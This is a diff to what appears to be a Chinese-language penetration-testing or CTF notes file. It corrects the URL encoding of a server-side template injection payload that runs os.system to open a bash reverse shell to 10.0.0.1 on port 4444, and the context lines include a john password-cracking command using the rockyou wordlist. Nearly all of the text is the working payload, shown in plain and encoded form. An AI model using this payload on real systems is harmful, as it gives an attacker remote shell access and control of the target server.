@@ -179,10 +179,10 @@ john hash --wordlist=rockyou.txt
 {% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')}}
 ```
 
-进行ascii编码：
+进行 url 编码：
 
 ```
-%7B%25%20import%20os%20%25%7D%7B%7Bos%2Esystem%28%27bash%20%2Dc%20%22bash%20%2Di%20%2E&%20%2Fdev%2Ftcp%2F10%2E0%2E0%2E1%2F4444%200%2E&1%22%27%29%7D%7D
+%7B%25%20import%20os%20%25%7D%7B%7Bos.system('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261%22')%7D%7D
 ```
 
 ## 其他
